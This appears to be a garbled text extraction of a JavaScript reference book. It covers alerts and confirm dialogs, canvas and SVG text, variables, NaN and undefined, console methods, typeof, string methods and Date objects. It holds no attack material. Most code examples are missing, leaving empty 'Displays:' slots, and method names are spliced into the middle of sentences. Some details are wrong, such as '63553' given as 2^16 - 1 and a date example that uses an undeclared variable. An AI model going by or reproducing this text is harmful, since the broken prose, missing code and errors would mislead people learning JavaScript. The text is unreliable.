<iframeWhile the prompt box is displayed, the user is prevented from accessing other parts of the page, since dialog boxes are modal windows.
 Starting with Chrome 46.0 this method is blocked inside an > unless its sandbox attribute has the value allow-modal.
 Section 1.5: Using window.confirm()
window.confirmThe () method displays a modal dialog with an optional message and two buttons, OK and Cancel.
Now, let's take the following example:

Here, message is the optional string to be displayed in the dialog and result is a boolean value indicating whether OK or Cancel was selected (true means OK).
window.confirm() is typically used to ask for user confirmation before doing a dangerous operation like deleting
something in a Control Panel:

The output of that code would look like this in the browser:

If you need it for later use, you can simply store the result of the user's interaction in a variable:
var deleteConfirm = window.confirm("Are you sure you want to delete this?");
Notes
The argument is optional and not required by the specification.
Dialog boxes are modal windows - they prevent the user from accessing the rest of the program's interface until the dialog box is closed. For this reason, you should not overuse any function that creates a dialog box
(or modal window). And regardless, there are very good reasons to avoid using dialog boxes for confirmation.
<iframeStarting with Chrome 46.0 this method is blocked inside an > unless its sandbox attribute has the value allow-modal.
It is commonly accepted to call the confirm method with the window notation removed as the window object is always implicit. However, it is recommended to explicitly define the window object as expected behavior may change due to implementation at a lower scope level with similarly named methods.
Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or image file)
Using canvas elements
HTML provides the canvas element for building raster-based images.
First build a canvas for holding image pixel information.

Then select a context for the canvas, in this case two-dimensional:

Then set properties related to the text:

Then insert the canvas element into the page to take effect:

Using SVG
SVG is for building scalable vector-based graphics and can be used within HTML.
First create an SVG element container with dimensions:

Then build a text element with the desired positioning and font characteristics:


Then add the actual text to display to the textelement:

Finally add the text element to our svg container and add the svg container element to the HTML document:

Image file
If you already have an image file containing the desired text and have it placed on a server, you can add the URL of the image and then add the image to the document as follows:


Chapter 2: JavaScript Variables
variable_name	{Required} The name of the variable: used when calling it.
=	[Optional] Assignment (defining the variable)
value	{Required when using Assignment} The value of a variable [default: undefined]
Variables are what make up most of JavaScript. These variables make up things from numbers to objects, which are all over JavaScript to make one's life much easier.
Section 2.1: Defining a Variable

This is an example of defining variables. This variable is called a "string" because it has ASCII characters (A-Z, 0-9,
!@#$, etc.)
Section 2.2: Using a Variable

window.alertHere, we defined a number called "number1" which was equal to 5. However, on the second line, we changed the value to 3. To show the value of a variable, we log it to the console or use ():

To add, subtract, multiply, divide, etc., we do like so:

We can also add strings which will concatenate them, or put them together. For example:

Section 2.3: Types of Variables


Section 2.4: Arrays and Objects

An array is a set of variables. For example:

An object is a group of values; unlike arrays, we can do something better than them:

"John Doe", "Billy"] and calling myArray[0], we can just call john.fullnameRather than making an array [ and
billy.fullname.
Chapter 3: Built-in Constants
Section 3.1: null
null is used for representing the intentional absence of an object value and is a primitive value. Unlike undefined, it is not a property of the global object.
It is equal to undefined but not identical to it.

CAREFUL: The typeof null is 'object'.

To properly check if a value is null, compare it with the strict equality operator

Section 3.2: Testing for NaN using isNaN()
window.isNaN()
isNaNThe global function () can be used to check if a certain value or expression evaluates to NaN. This function (in short) first checks if the value is a number, if not tries to convert it (*), and then checks if the resulting value is NaN. For this reason, this testing method may cause confusion.
(*) The "conversion" method is not that simple, see ECMA-262 18.2.3 for a detailed explanation of the algorithm.
isNaNThese examples will help you better understand the () behavior:
isNaN(NaN);          // true isNaN(1);            // false: 1 is a number isNaN(-2e-4);        // false: -2e-4 is a number (-0.0002) in scientific notation isNaN(Infinity);     // false: Infinity is a number isNaN(true);         // false: converted to 1, which is a number isNaN(false);        // false: converted to 0, which is a number isNaN(null);         // false: converted to 0, which is a number isNaN("");           // false: converted to 0, which is a number isNaN(" ");          // false: converted to 0, which is a number isNaN("45.3");       // false: string representing a number, converted to 45.3 isNaN("1.2e3");      // false: string representing a number, converted to 1.2e3 isNaN("Infinity");   // false: string representing a number, converted to Infinity isNaN(new Date);     // false: Date object, converted to milliseconds since epoch isNaN("10$");        // true : conversion fails, the dollar sign is not a digit isNaN("hello");      // true : conversion fails, no digits at all isNaN(undefined);    // true : converted to NaN isNaN();             // true : converted to NaN (implicitly undefined) isNaN(function(){}); // true : conversion fails isNaN({});           // true : conversion fails
isNaN([1, 2]);       // true : converted to "1, 2", which can't be converted to a number
NumberisNaN([]) and isNaN([34]) both return false, but isNaNThis last one is a bit tricky: checking if an Array is NaN. To do this, the () constructor first converts the array to a string, then to a number; this is the reason why ([1,
isNaN([trueisNaN2]) and ]) both return true: because they get converted to "", "34", "1,2" and "true" respectively. In general, an array is considered NaN by () unless it only holds one element whose string representation can be converted to a valid number.
Version ≥ 6
Number.isNaN()
Number.isNaNIn ECMAScript 6, the () function has been implemented primarily to avoid the problem of
window.isNaN() of forcefully converting the parameter to a number. Number.isNaNNumber.isNaN(NaN(), indeed, doesn't try to convert the value to a number before testing. This also means that only values of the type number, that are also NaN, return true (which basically means only )).
From ECMA-262 20.1.2.4:
Number.isNaNWhen the  is called with one argument number, the following steps are taken:
1. If Type(number) is not Number, return false.
2. If number is NaN, return true.
3. Otherwise, return false.
Some examples:

Section 3.3: NaN
NaN stands for "Not a Number." When a mathematical function or operation in JavaScript cannot return a specific number, it returns the value NaN instead.
Number.NaNIt is a property of the global object, and a reference to 

Perhaps confusingly, NaN is still considered a number.

Don't check for NaN using the equality operator. See isNaN instead.

Section 3.4: undefined and null
At first glance it may appear that null and undefined are basically the same, however there are subtle but important differences.
undefined is the absence of a value in the compiler, because where it should be a value, there hasn't been put one, like the case of an unassigned variable.
undefined is a global value that represents the absence of an assigned value.
typeof undefined === 'undefined'null is an object that indicates that a variable has been explicitly assigned "no value".
typeof null === 'object'Setting a variable to undefined means the variable effectively does not exist. Some processes, such as JSON serialization, may strip undefined properties from objects. In contrast, null properties indicate will be preserved so you can explicitly convey the concept of an "empty" property.
The following evaluate to undefined:
 A variable when it is declared but not assigned a value (i.e. defined)

undefined is also a property of the global window object.

Version < 5
window.undefinedBefore ECMAScript 5 you could actually change the value of the  property to any other value potentially breaking everything.
Section 3.5: Infinity and -Infinity

Number.POSITIVE_INFINITYInfinity is a property of the global object (therefore a global variable) that represents mathematical infinity. It is a reference to 
It is greater than any other value, and you can get it by dividing by 0 or by evaluating the expression of a number that's so big that overflows. This actually means there is no division by 0 errors in JavaScript, there is Infinity!
InfinityThere is also - which is mathematical negative infinity, and it's lower than any other value.
Infinity you negate Infinity, or get a reference to it in Number.NEGATIVE_INFINITYTo get -.

Now let's have some fun with examples:

Section 3.6: Number constants
The Number constructor has some built in constants that can be useful


In many cases the various operators in JavaScript will break with values outside the range of
Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER()
Number.EPSILONNote that  represents the different between one and the smallest Number greater than one, and thus the smallest possible difference between two different Number values. One reason to use this is due to the nature of how numbers are stored by JavaScript see Check the equality of two numbers
Section 3.7: Operations that return NaN
Mathematical operations on values other than numbers return NaN.

An exception: Single-number arrays.

Also, remember that the + operator concatenates strings.

Dividing zero by zero returns NaN.

Note: In mathematics generally (unlike in JavaScript programming), dividing by zero is not possible.
Section 3.8: Math library functions that return NaN
Generally, Math functions that are given non-numeric arguments will return NaN.

Math.sqrtThe square root of a negative number returns NaN, because  does not support imaginary or complex numbers.

Chapter 4: Comments
Section 4.1: Using Comments
To add annotations, hints, or exclude some code from being executed JavaScript provides two ways of commenting code lines
Single line Comment //
Everything after the // until the end of the line is excluded from execution.
// TODO: write more cool stuff!
Multi-line Comment /**/
Everything between the opening /* and the closing */ is excluded from execution, even if the opening and closing are on different lines.

Section 4.2: Using HTML comments in JavaScript (Bad practice)
HTML comments (optionally preceded by whitespace) will cause code (on the same line) to be ignored by the browser also, though this is considered bad practice.
One-line comments with the HTML comment opening sequence (<!--):

This technique can be observed in legacy code to hide JavaScript from browsers that didn't support it:


An HTML closing comment can also be used in JavaScript (independent of an opening comment) at the beginning of a line (optionally preceded by whitespace) in which case it too causes the rest of the line to be ignored:

These facts have also been exploited to allow a page to call itself first as HTML and secondly as JavaScript. For example:

When run a HTML, all the multiline text between the <!-- and --> comments are ignored, so the JavaScript contained therein is ignored when run as HTML.
self.postMessage(...As JavaScript, however, while the lines beginning with <!-- and --> are ignored, their effect is not to escape over multiple lines, so the lines following them (e.g., ) will not be ignored when run as JavaScript, at least until they reach a JavaScript comment, marked by /* and */. Such JavaScript comments are used in the above example to ignore the remaining HTML text (until the --> which is also ignored as JavaScript).
Chapter 5: Console
console.dir(console). Besides the console.memoryThe information displayed by a debugging/web console is made available through the multiple methods of the console Javascript object that can be consulted through property, the methods displayed are generally the following (taken from Chromium's output):
assert clear count debug
dir dirxml error group groupCollapsed groupEnd
info log markTimeline profile profileEnd table time timeEnd timeStamp timeline timelineEnd trace warn
Opening the Console
In most current browsers, the JavaScript Console has been integrated as a tab within Developer Tools. The shortcut keys listed below will open Developer Tools, it might be necessary to switch to the right tab after that.
Chrome
Opening the "Console" panel of Chrome's DevTools:
 Windows / Linux: any of the following options.
 Ctrl  +  Shift  +  J 
 Ctrl  +  Shift  +  I , then click on the "Web Console" tab or press  ESC  to toggle the console on and off
 F12 , then click on the "Console" tab or press  ESC  to toggle the console on and off
 Mac OS:  Cmd  +  Opt  +  J 
Firefox
Opening the "Console" panel in Firefox's Developer Tools:
 Windows / Linux: any of the following options.
 Ctrl  +  Shift  +  K 
 Ctrl  +  Shift  +  I , then click on the "Web Console" tab or press  ESC  to toggle the console on and off
 F12 , then click on the "Web Console" tab or press  ESC  to toggle the console on and off
 Mac OS:  Cmd  +  Opt  +  K 
Edge and Internet Explorer
Opening the "Console" panel in the F12 Developer Tools:
 F12 , then click on the "Console" tab
Safari
Opening the "Console" panel in Safari's Web Inspector you must first enable the develop menu in Safari's
Preferences


Opera
Opening the "Console" in opera:
 Ctrl  +  Shift  +  I ,then click on the "Console" tab
Compatibility
console.logWhen using or emulating Internet Explorer 8 or earlier versions (e.g. through Compatibility View / Enterprise Mode) the console will only be defined when the Developer Tools are active, so () statements can cause an exception and prevent code from executing. To mitigate this, you can check to see if the console is available before you log:

Or at the start of your script you can identify if the console is available and if not, define a null function to catch all of your references and prevent exceptions.

Note this second example will stop all console logs even if the developer window has been opened.
console.dir(objUsing this second example will preclude use of other functions such as ) unless that is specifically added.
A browser's debugging console or web console is generally used by developers to identify errors, understand flow of execution, log data and for many other purpose at runtime. This information is accessed through the console object.
Section 5.1: Measuring time - console.time()
console.time() can be used to measure how long a task in your code takes to run.
console.time([label]) starts a new timer. When console.timeEnd([labelCalling ]) is called, the elapsed time, in
timemilliseconds, since the original .() call is calculated and logged. Because of this behavior, you can call
timeEnd() multiple times with the same label to log the elapsed time since the original .time.() call was made.
Example 1:

will output:

Example 2:

will output:

Section 5.2: Formatting console output
Many of the console's print methods can also handle C-like string formatting, using % tokens:

Sam has 100 pointsDisplays .
The full list of format specifiers in JavaScript is:
Specifier	Output
%s	Formats the value as a string
%i or %d Formats the value as an integer
%f	Formats the value as a floating point value
%o	Formats the value as an expandable DOM element
%O	Formats the value as an expandable JavaScript object
%c	Applies CSS style rules to the output string as specified by the second parameter
Advanced styling
When the CSS format specifier (%c) is placed at the left side of the string, the print method will accept a second parameter with CSS rules which allow fine-grained control over the formatting of that string: console.log('%cHello world!', 'color: blue; font-size: xx-large'); Displays:

It is possible to use multiple %c format specifiers:
any substring to the right of a %c has a corresponding parameter in the print method; this parameter may be an empty string, if there is no need to apply CSS rules to that same substring; if two %c format specifiers are found, the 1st (encased in %c) and 2nd substring will have their rules defined in the 2nd and 3rd parameter of the print method respectively.
if three %c format specifiers are found, then the 1st, 2nd and 3rd substrings will have their rules defined in the 2nd , 3rd and 4th parameter respectively, and so on...
console.log("%cHello %cWorld%c!!", // string to be printed
            "color: blue;", // applies color formatting to the 1st substring
            "font-size: xx-large;", // applies font formatting to the 2nd substring
            "/* no CSS rule*/" // does not apply any rule to the remaining substring );
Displays:

Using groups to indent output
Output can be indented and enclosed in a collapsible group in the debugging console with the following methods:
(): creates a collapsed group of entries that can be expanded through the
console.groupCollapsedconsole.groupdisclosure button in order to reveal all the entries performed after this method is invoked;
(): creates an expanded group of entries that can be collapsed in order to hide the entries
after this method is invoked.
The indentation can be removed for posterior entries by using the following method:
 console.groupEnd(): exits the current group, allowing newer entries to be printed in the parent group after this method is invoked.
Groups can be cascaded to allow multiple indented output or collapsible layers within each other:
 Collapsed group expanded => =	 
Section 5.3: Printing to a browser's debugging console
A browser's debugging console can be used in order to print simple messages. This debugging or web console can be directly opened in the browser ( F12  key in most browsers - see Remarks below for further information) and the log method of the console JavaScript object can be invoked by typing the following:

Then, by pressing  Enter , this will display My message in the debugging console.
console.log() can be called with any number of arguments and variables available in the current scope. Multiple
arguments will be printed in one line with a small space between them.

The log method will display the following in the debugging console:

console.logBeside plain strings, () can handle other types, like arrays, objects, dates, functions, etc.:

Displays:

Nested objects may be collapsed: console.log({ key1: 'val', key2: ['one', 'two'], key3: { a: 1, b: 2 } }); Displays:

Certain types such as Date objects and functions may be displayed differently:

Displays:

Other print methods
In addition to the log method, modern browsers also support similar methods:

console.info
console.warn- small informative icon (ⓘ) appears on the left side of the printed string(s) or object(s).
- small warning icon (!) appears on the left side. In some browsers, the background of the log
is yellow.
console.error		 - small times icon (⊗) appears on the left side. In some browsers, the background of the log is
red.

Displays:

the global scope.


Displays:


The above image shows all the functions, with the exception of timeStamp, in Chrome version 56.
These methods behave similarly to the log method and in different debugging consoles may render in different colors or formats.
console.dirIn certain debuggers, the individual objects information can be further expanded by clicking the printed text or a small triangle (►) which refers to the respective object properties. These collapsing object properties can be open or closed on log. See the  for additional information on this
Section 5.4: Including a stack trace when logging console.trace()

Will display this in the console:

Note: Where available it's also useful to know that the same stack trace is accessible as a property of the Error object. This can be useful for post-processing and gathering automated feedback.

Section 5.5: Tabulating values - console.table()
console.tableIn most environments, () can be used to display objects and arrays in a tabular format.
For example:

displays like:
(index) value
0	"Hello" 1	"world"

displays like:
(index) value
"foo" "bar" "bar" "baz"

displays like:

Section 5.6: Counting - console.count()
console.count([obj]) places a counter on the object's value provided as argument. Each time this method is
invoked, the counter is increased (with the exception of the empty string ''). A label together with a number is displayed in the debugging console according to the following format:

label represents the value of the object passed as argument and X represents the counter's value.
An object's value is always considered, even if variables are provided as arguments:

Displays:



Displays:


Displays:

Certain objects get specific counters associated to the type of object they refer to:

Displays:


Empty string or absence of argument
If no argument is provided while sequentially inputting the count method in the debugging console, an empty string is assumed as parameter, i.e.:

Section 5.7: Clearing the console - console.clear()
console.clearYou can clear the console window using the () method. This removes all previously printed messages in the console and may print a message like "Console was cleared" in some environments.
Section 5.8: Displaying objects and XML interactively console.dir(), console.dirxml()
console.dir(object) displays an interactive list of the properties of the specified JavaScript object. The output is
presented as a hierarchical listing with disclosure triangles that let you see the contents of child objects.

displays:

console.dirxml(objectconsole.dirxmlconsole.log) prints an XML representation of the descendant elements of object if possible, or the JavaScript representation if not. Calling () on HTML and XML elements is equivalent to calling ().
Example 1:

displays:

Example 2:

displays:

Example 3:

displays:

Section 5.9: Debugging with assertions - console.assert()
Writes an error message to the console if the assertion is false. Otherwise, if the assertion is true, this does nothing.

Multiple arguments can be provided after the assertion-these can be strings or other objects-that will only be printed if the assertion is false:

console.assert does not throw an AssertionError (except in Node.js), meaning that this method is incompatible
with most testing frameworks and that code execution will not break on a failed assertion.
Chapter 6: Datatypes in JavaScript
Section 6.1: typeof
typeof is the 'official' function that one uses to get the type in JavaScript, however in certain cases it might yield some unexpected results ...
1. Strings
typeof "String" or
typeof Date(2011,01,01)
		"string"
2. Numbers
typeof 42
		"number"
3. Bool
typeof true (valid values true and false)
		"boolean"
4. Object
typeof {}typeof []typeof nulltypeof /aaa/ or  or  or  or
typeof Error()
		"object"
5. Function
typeof function(){}
		"function"
6. Undefined
var var1; typeof var1
		"undefined"
Section 6.2: Finding an object's class
To find whether an object was constructed by a certain constructor or one inheriting from it, you can use the

Note that primitive values are not considered instances of any class:

Every value in JavaScript besides null and undefined also has a constructor property storing the function that was used to construct it. This even works with primitives.
//Whereas instanceof also catches instances of subclasses, //using obj.constructor does not console.log([] instanceof Object, [] instanceof Array)           //true true console.log([].constructor === Object, [].constructor === Array) //false true
function isNumber(value) {
    //null.constructor and undefined.constructor throw an error when accessed     if (value === null || value === undefined) return false     return value.constructor === Number } console.log(isNumber(null), isNumber(undefined))                  //false false console.log(isNumber('abc'), isNumber([]), isNumber(() => 1))     //false false false console.log(isNumber(0), isNumber(Number('10.1')), isNumber(NaN)) //true true true
Section 6.3: Getting object type by constructor name
When one with typeof operator one gets type object it falls into somewhat wast category...
In practice you might need to narrow it down to what sort of 'object' it actually is and one way to do it is to use
Object.prototype.toString.call(yourObjectobject constructor name to get what flavour of object it actually is: )
1. String
Object.prototype.toString.call("String")
		"[object String]"
2. Number
Object.prototype.toString.call(42)
		"[object Number]"
3. Bool
Object.prototype.toString.call(true)
		"[object Boolean]"
4. Object
ObjectcallcalltoStringtoStringprototypeprototypeObjectObject...(()) or ...({})
		"[object Object]"
5. Function
Object.prototype.toString.call(function(){})
		"[object Function]"
6. Date
Object.prototype.toString.call(new Date(2015,10,21))
		"[object Date]"
7. Regex
new RegExpcallcalltoStringtoStringprototypeprototypeObjectObject/foo/...(()) or ...();
		"[object RegExp]"
8. Array
Object.prototype.toString.call([]);
		"[object Array]"
9. Null
Object.prototype.toString.call(null);
		"[object Null]"
10. Undefined
Object.prototype.toString.call(undefined);
		"[object Undefined]"
11. Error
Object.prototype.toString.call(Error());
		"[object Error]"

Chapter 7: Strings
Section 7.1: Basic Info and String Concatenation
Strings in JavaScript can be enclosed in Single quotes 'hello', Double quotes "Hello" and (from ES2015, ES6) in Template Literals (backticks) `hello`.

StringStrings can be created from other types using the () function.

toStringOr, () can be used to convert Numbers, Booleans or Objects to Strings.

String.fromCharCodeStrings also can be created by using  method.

Creating a String object using new keyword is allowed, but is not recommended as it behaves like Objects unlike primitive strings.

Concatenating Strings
concatString concatenation can be done with the + concatenation operator, or with the built-in () method on the String object prototype.

Strings can be concatenated with non-string variables but will type-convert the non-string variables into strings.

String Templates
Version ≥ 6
Strings can be created using template literals (backticks) `hello`.

variableWith template literals, you can do string interpolation using ${} inside template literals:

You can use String.raw to get backslashes to be in the string without modification.

Section 7.2: Reverse String
The most "popular" way of reversing a string in JavaScript is the following code fragment, which is quite common:

However, this will work only so long as the string being reversed does not contain surrogate pairs. Astral symbols, i.e. characters outside of the basic multilingual plane, may be represented by two code units, and will lead this naive technique to produce wrong results. Moreover, characters with combining marks (e.g. diaeresis) will appear on the logical "next" character instead of the original one it was combined with.

While the method will work fine for most languages, a truly accurate, encoding respecting algorithm for string reversal is slightly more involved. One such implementation is a tiny library called Esrever, which uses regular expressions for matching combining marks and surrogate pairs in order to perform the reversing perfectly.
Explanation
               Section Explanation Result str The input string "string"
String.prototypedeliminator )split"s","t","r","i","n","g"Splits string str into an array. The
.(
parameter "" means to split between each [] character.
Array.prototype.reverse"g","n","i","r","t","s"Returns the array from the split string with
	()	[]
its elements in reverse order.
Joins the elements in the array together into
prototype.join( deliminatorArray.a string. The "" parameter means an empty
"gnirts"
)	deliminator (i.e., the elements of the array
are put right next to each other).
Using spread operator
Version ≥ 6


Section 7.3: Comparing Strings Lexicographically
localeCompareTo compare strings alphabetically, use (). This returns a negative value if the reference string is lexicographically (alphabetically) before the compared string (the parameter), a positive value if it comes afterwards, and a value of 0 if they are equal.

localeCompareThe > and < operators can also be used to compare strings lexicographically, but they cannot return a value of zero (this can be tested with the == equality operator). As a result, a form of the () function can be written like so:

This is especially useful when using a sorting function that compares based on the sign of the return value (such as sort).


Section 7.4: Access character at index in string
charAtUse () to get a character at the specified index in the string.

Alternatively, because strings can be treated like arrays, use the index via bracket notation.

charCodeAtTo get the character code of the character at a specified index, use ().

Note that these methods are all getter methods (return a value). Strings in JavaScript are immutable. In other words, none of them can be used to set a character at a position in the string.
Section 7.5: Escaping quotes
If your string is enclosed (i.e.) in single quotes you need to escape the inner literal quote with backslash \

Same goes for double quotes:

Special attention must be given to escaping quotes if you're storing HTML representations within a String, since HTML strings make large use of quotations i.e. in attributes:
var content = "<p class=\"special\">Hello World!</p>";        // valid String var hello   = '<p class="special">I\'d like to say "Hi"</p>'; // valid String
apos; (or &#39;) as a single quote and &quot; ( or &#34Quotes in HTML strings can also be represented using &;) as double quotes.
var hi    = "<p class='special'>I'd like to say &quot;Hi&quot;</p>"; // valid String var hello = '<p class="special">I&apos;d like to say "Hi"</p>';      // valid String
apos; and &quotNote: The use of &; will not overwrite double quotes that browsers can automatically place on
<p class=special> being made to <p class="special">, using &quotattribute quotes. For example ; can lead to
<p class=""special""> where \" will be <p class="special">.
Version ≥ 6
If a string has ' and " you may want to consider using template literals (also known as template strings in previous ES6 editions), which do not require you to escape ' and ". These use backticks (`) instead of single or double quotes.

Section 7.6: Word Counter
<textareaSay you have a > and you want to retrieve info about the number of:

Section 7.7: Trim whitespace
String.prototype.trimTo trim whitespace from the edges of a string, use :
"    some whitespaced string  ".trim();  // "some whitespaced string"
Many JavaScript engines, but not Internet Explorer, have implemented non-standard trimLeft and trimRight methods. There is a proposal, currently at Stage 1 of the process, for standardised trimStart and trimEnd methods, aliased to trimLeft and trimRight for compatibility.

Section 7.8: Splitting a string into an array
splitUse . to go from strings to an array of the split substrings:

joinUse the array method . to go back to a string:

Section 7.9: Strings are unicode
All JavaScript strings are unicode!

There are no raw byte or binary strings in JavaScript. To effectively handle binary data, use Typed Arrays.
Section 7.10: Detecting a string
To detect whether a parameter is a primitive string, use typeof:

new String("somestr"If you ever have a String object, via ), then the above will not work. In this instance, we can use instanceof:

To cover both instances, we can write a simple helper function:

Or we can make use of toString function of Object. This can be useful if we have to check for other types as well say in a switch statement, as this method supports other datatypes as well just like typeof.
var pString = "Primitive String";
var oString = new String("Object Form of String");
Object.prototype.toString.call(pString);//"[object String]"
Object.prototype.toString.call(oString);//"[object String]"    
A more robust solution is to not detect a string at all, rather only check for what functionality is required. For example:


Section 7.11: Substrings with slice
sliceUse .() to extract substrings given two indices:

Given one index, it will take from that index to the end of the string:

Section 7.12: Character code
The method charCodeAt retrieves the Unicode character code of a single character: var charCode = "µ".charCodeAt(); // The character code of the letter µ is 181
To get the character code of a character in a string, the 0-based position of the character is passed as a parameter to charCodeAt:
var charCode = "ABCDE".charCodeAt(3); // The character code of "D" is 68
Version ≥ 6
Some Unicode symbols don't fit in a single character, and instead require two UTF-16 surrogate pairs to encode. This is the case of character codes beyond 216 - 1 or 63553. These extended character codes or code point values can be retrieved with codePointAt:

Section 7.13: String Representations of Numbers
JavaScript has native conversion from Number to its String representation for any base from 2 to 36.
The most common representation after decimal (base 10) is hexadecimal (base 16), but the contents of this section work for all bases in the range.
In order to convert a Number from decimal (base 10) to its hexadecimal (base 16) String representation the toString method can be used with radix 16.

If the number represented is an integer, the inverse operation for this can be done with parseInt and the radix 16 again

To convert an arbitrary number (i.e. non-integer) from its String representation into a Number, the operation must be split into two parts; the integer part and the fraction part.
Version ≥ 6

Note 1: Be careful as small errors may be in the result due to differences in what is possible to be represented in different bases. It may be desirable to perform some kind of rounding afterwards.
Note 2: Very long representations of numbers may also result in errors due to the accuracy and maximum values of Numbers of the environment the conversions are happening in.
Section 7.14: String Find and Replace Functions
To search for a string inside a string, there are several functions:
indexOf( searchString ) and lastIndexOf( searchString )
indexOf() will return the index of the first occurrence of searchString in the string. If searchString is not found, then -1 is returned.

lastIndexOfSimilarly, () will return the index of the last occurrence of searchstring or -1 if not found.

includes( searchString, start )
includesindexOf          () will return a boolean that tells whether searchString exists in the string, starting from index start (defaults to 0). This is better than () if you simply need to test for existence of a substring.

replace( regexp|substring, replacement|replaceFunction )
replace() will return a string that has all occurrences of substrings matching the RegExp regexp or string substring with a string replacement or the returned value of replaceFunction.
Note that this does not modify the string in place, but returns the string with replacements.

replaceFunction can be used for conditional replacements for regular expression objects (i.e., with use with regexp). The parameters are in the following order:
Parameter	Meaning
match	the substring that matches the entire regular expressiong g1, g2, g3, ... the matching groups in the regular expression offset	the offset of the match in the entire string string	the entire string
Note that all parameters are optional.

Section 7.15: Find the index of a substring inside a string
indexOfThe . method returns the index of a substring inside another string (if exists, or -1 if otherwise)

indexOf. also accepts an additional numeric argument that indicates on what index should the function start looking

indexOfYou should note that . is case sensitive

Section 7.16: String to Upper Case

Section 7.17: String to Lower Case
String.prototype.toLowerCase()

Section 7.18: Repeat a String
Version ≥ 6
This can be done using the .repeat() method:

In the general case, this should be done using a correct polyfill for the ES6 String.prototype.repeat() method.


Chapter 8: Date
Parameter	Details
value	The number of milliseconds since 1 January 1970 00:00:00.000 UTC (Unix epoch) dateAsString A date formatted as a string (see examples for more information)
The year value of the date. Note that month must also be provided, or the value will be interpreted
year	as a number of milliseconds. Also note that values between 0 and 99 have special meaning. See the examples.
11The month, in the range 0-. Note that using values outside the specified range for this and the
month	following parameters will not result in an error, but rather cause the resulting date to "roll over" to the next value. See the examples.
31235959999day	Optional: The date, in the range 1-. hour	Optional: The hour, in the range 0-. minute	Optional: The minute, in the range 0-. second	Optional: The second, in the range 0-. millisecond Optional: The millisecond, in the range 0-.
Section 8.1: Create a new Date object
DateTo create a new Date object use the () constructor:
 with no arguments
Date() creates a Date instance containing the current time (up to milliseconds) and date.
 with one integer argument
Datenew Date(749019369738(m) creates a Date instance containing the time and date corresponding to the Epoch time (1 January, 1970 UTC) plus m milliseconds. Example: ) gives the date Sun, 26 Sep 1993 04:56:09 GMT.
 with a string argument
Date(dateString) returns the Date object that results after parsing dateString with Date.parse.
 with two or more integer arguments
Date(i1, i2, i3, i4, i5, i6) reads the arguments as year, month, day, hours, minutes, seconds,
new Date(2017milliseconds and instantiates the corresponding Dateobject. Note that the month is 0-indexed in JavaScript, so 0 means January and 11 means December. Example: , 5, 1) gives June 1st, 2017.
Exploring dates
Note that these examples were generated on a browser in the Central Time Zone of the US, during Daylight Time,
Date.prototype.toISOStringas evidenced by the code. Where comparison with UTC was instructive, () was used to show the date and time in UTC (the Z in the formatted string denotes UTC).
// Creates a Date object with the current date and time from the // user's browser var now = new Date(); now.toString() === 'Mon Apr 11 2016 16:10:41 GMT-0500 (Central Daylight Time)' // true
// well, at the time of this writing, anyway
// Creates a Date object at the Unix Epoch (i.e., '1970-01-01T00:00:00.000Z') var epoch = new Date(0); epoch.toISOString() === '1970-01-01T00:00:00.000Z' // true
// Creates a Date object with the date and time 2,012 milliseconds // after the Unix Epoch (i.e., '1970-01-01T00:00:02.012Z'). var ms = new Date(2012); date2012.toISOString() === '1970-01-01T00:00:02.012Z' // true
// Creates a Date object with the first day of February of the year 2012 // in the local timezone. var one = new Date(2012, 1); one.toString() === 'Wed Feb 01 2012 00:00:00 GMT-0600 (Central Standard Time)' // true
// Creates a Date object with the first day of the year 2012 in the local // timezone. // (Months are zero-based) var zero = new Date(2012, 0); zero.toString() === 'Sun Jan 01 2012 00:00:00 GMT-0600 (Central Standard Time)' // true
// Creates a Date object with the first day of the year 2012, in UTC. var utc = new Date(Date.UTC(2012, 0)); utc.toString() === 'Sat Dec 31 2011 18:00:00 GMT-0600 (Central Standard Time)'
// true utc.toISOString() === '2012-01-01T00:00:00.000Z'
// true
// Parses a string into a Date object (ISO 8601 format added in ECMAScript 5.1) // Implementations should assumed UTC because of ISO 8601 format and Z designation var iso = new Date('2012-01-01T00:00:00.000Z'); iso.toISOString() === '2012-01-01T00:00:00.000Z' // true
// Parses a string into a Date object (RFC in JavaScript 1.0) var local = new Date('Sun, 01 Jan 2012 00:00:00 -0600'); local.toString() === 'Sun Jan 01 2012 00:00:00 GMT-0600 (Central Standard Time)' // true
// Parses a string in no particular format, most of the time. Note that parsing
// logic in these cases is very implementation-dependent, and therefore can vary // across browsers and versions.
var anything = new Date('11/12/2012'); anything.toString() === 'Mon Nov 12 2012 00:00:00 GMT-0600 (Central Standard Time)' // true, in Chrome 49 64-bit on Windows 10 in the en-US locale. Other versions in // other locales may get a different result.
// Rolls values outside of a specified range to the next value.
var rollover = new Date(2012, 12, 32, 25, 62, 62, 1023); rollover.toString() === 'Sat Feb 02 2013 02:03:03 GMT-0600 (Central Standard Time)' // true; note that the month rolled over to Feb; first the month rolled over to
// Jan based on the month 12 (11 being December), then again because of the day 32 // (January having 31 days).

Section 8.2: Convert to a string format






This function has been marked as deprecated so some browsers may not support it in the future. It is suggested to use toUTCString() instead.

This function returns a locale sensitive date string based upon the user's location by default.

can be used to provide specific locales but is browser implementation specific. For example,

would attempt to print the string in the Chinese locale using United States English as a fallback. The options parameter can be used to provide specific formatting. For example:
 var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }; date1.toLocaleDateString([], options); would result in
		"Thursday, April 14, 2016".
See the MDN for more details.
Section 8.3: Creating a Date from UTC
By default, a Date object is created as local time. This is not always desirable, for example when communicating a date between a server and a client that do not reside in the same timezone. In this scenario, one doesn't want to worry about timezones at all until the date needs to be displayed in local time, if that is even required at all.
The problem
In this problem we want to communicate a specific date (day, month, year) with someone in a different timezone. The first implementation naively uses local times, which results in wrong results. The second implementation uses UTC dates to avoid timezones where they are not needed.
Naive approach with WRONG results

And thus, Bar would always believe Foo was born on the last day of 1999.
Correct approach


Creating a Date from UTC
Date.UTC(...If one wants to create a Date object based on UTC or GMT, the ) method can be used. It uses the same arguments as the longest Date constructor. This method will return a number representing the time that has passed since January 1, 1970, 00:00:00 UTC.

Unsurprisingly, the difference between UTC time and local time is, in fact, the timezone offset converted to milliseconds.

Changing a Date object
setDate(...) and setFullYear(...All Date object modifiers, such as ) have an equivalent takes an argument in
UTC time rather than in local time.

 Mon Jan 31 2000 13:00:00 GMT+0100 (West-Europa (standaardtijd))
setUTCMonth(), .setUTCDateThe other UTC-specific modifiers are .() (for the day of the month),
setUTCMinutes(), .setUTCSeconds() and .setUTCMilliseconds.().
Avoiding ambiguity with getTime() and setTime()
